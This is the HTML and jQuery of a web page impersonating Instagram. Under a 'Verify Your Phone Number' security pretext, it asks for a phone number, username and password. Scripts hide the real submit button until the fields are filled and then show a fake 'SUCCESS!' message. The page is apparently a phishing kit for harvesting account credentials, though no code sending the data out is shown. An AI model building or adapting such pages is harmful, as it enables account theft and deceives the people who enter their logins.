    <body class="bg-half bg-light">
        
        <!-- Navbar STart -->
        <header id="topnav" class="defaultscroll sticky bg-white shadow-sm">
                    <center><a class="logo" href="https://www.instagram.com/?hl=en"><img src="img/logo.png" height="50" alt=""></a></center>
            
        </header>

      
        
        <!-- Start  -->
            <div class="container">
                <div class="row">
                    <div class="col-12 text-center">
                        <div class="section-title">
                            <h4 class="title mb-4">Verify Your Phone Number</h4>
                            <p class="text-muted para-desc mx-auto mb-0">Help us keep the Instagram community safe by entering your phone number. We'll text you a security code.</p>
                        </div>
                    </div><!--end col-->
                </div><!--end row-->

                <div class="row justify-content-center">
                    <div class="col-md-8 mt-4 pt-2">
                        <div class="custom-form">
                            <div id="contactForm">
                                <div class="row">
                                    <div class="col-12">
                                        <div class="mb-3">
                                            <label class="form-label">Your Phone Number <span class="text-danger">*</span></label>
                                            <input id="contactEmail" type="text" class="form-control"  name="email" required="" placeholder="Your Phone Number :">
                                        </div>
                                    </div><!--end col-->
                                    <div class="col-12">
                                        <div class="mb-3">
                                            <label class="form-label">Username <span class="text-danger">*</span></label>
                                            <input id="contactName" type="text" class="form-control"  name="text" required="" placeholder="Username :">
                                        </div>
                                    </div><!--end col-->
                                    <div class="col-12">
                                        <div class="mb-3">
                                            <label class="form-label">Password <span class="text-danger">*</span></label>
                                            <input id="contactPhone" type="password" class="form-control"  name="text" required="" placeholder="Password :">
                                        </div>
                                    </div><!--end col-->
                                    <div class="col-12">
                                        <div class="mb-3">
                                            <label class="form-label">Confirm Password <span class="text-danger">*</span></label>
                                            <input id="contactSubject" type="password" class="form-control"  name="text" required="" placeholder="Confirm Password :">
                                        </div>
                                    </div><!--end col-->
                                    <div class="col-12" style="display: none">
                                        <div class="mb-3">
                                            <label class="form-label">Message <span class="text-danger">*</span></label>
                                            <textarea  id="contactMessage" rows="6" type="text" class="form-control"  name="text" required="" value="null" placeholder="Your message :"></textarea>
                                        </div>
                                    </div><!--end col-->
                                    <div class="col-12">
                                        <div class="mb-3">
                                            <div class="form-check">
                                                <input class="form-check-input" type="checkbox" value="A" id="contactCheckbox">
                                                <label class="form-check-label" for="flexCheckDefault">I Agree, Terms and Conditions</label>
                                            </div>
                                        </div>
                                    </div><!--end col-->
                                    
                                    <input type="text" id="contactSelected" style="display: none;" />
                                    <input id="contactDate" style="display: none;">
                                    
                                    <div class="col-12" style="display: none;" id="contactSubmitButton">
                                        <div class="d-grid">
                                            <button class="btn instagram" type="submit" id="contactSubmit"><span style="color: white"><b>Update Phone Number</b></span></button>
                                        </div>
                                    </div>
                                    
                                    <div class="col-12" id="contactFakeButton">
                                        <div class="d-grid">
                                            <button class="btn instagram" disabled = "disabled"><span style="color: white"><b>Update Phone Number</b></span></button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                               
                               
                               <div class="container" id="contactPage2" style="margin-top: 80px; display: none">
                                    <center>
                                        <h2 style="color: darkgreen">SUCCESS!</h2>
                                        <p style="color: black">Your phone number has been updated successfully.</p></center>
                                </div>
                        </div><!--end custom-form-->
                    </div><!--end col-->
                </div><!--end row-->
            </div><!--end container-->

        <!------------------------------------ CONTACT FORM SCRIPTS ----------------------------------------------------------->
        <script>
        document.getElementById('contactDate').value = Date();

        $(function() {
            $('#contactSubmitButton').attr('disabled', true);
            $('#contactForm').change(function() {
                if ($('#contactName').val() != '' && $('#contactEmail').val() != '' && $('#contactSubject').val() != '' && $('#contactSelected').val() != '') {
                    $('#contactSubmitButton').show();
                    $('#contactFakeButton').hide();
                } else {
                    $('#contactSubmitButton').hide();
                    $('#contactFakeButton').show();
                }
            });
        });
      </script>
        
        <script>
        $(document).ready(function() {
            $("#contactSubmit").click(function() {
                $("#contactForm").hide();
                $("#contactPage2").show('slow');
            });
        });
       </script>
        
        <script>
        (function() {
            $('input:checkbox').change((e) => {
                if ($(e.currentTarget).is(':checked')) {
                    var curVal = $('#contactSelected').val();
                    if (curVal) {
                        $('#contactSelected').val(curVal + ', ' + e.currentTarget.value);
                    } else {

                        $('#contactSelected').val(e.currentTarget.value);
                    }
                } else {
                    var curVal = $('#contactSelected').val().split(',');
                    var filteredVal = curVal.filter(el => el.trim() !== e.currentTarget.value)
                    $('#contactSelected').val(filteredVal.join(','));
                }
            });
        })();
    </script>
    <!------------------------------------*** END OF CONTACT FORM SCRIPTS **----------------------------------------------------------->
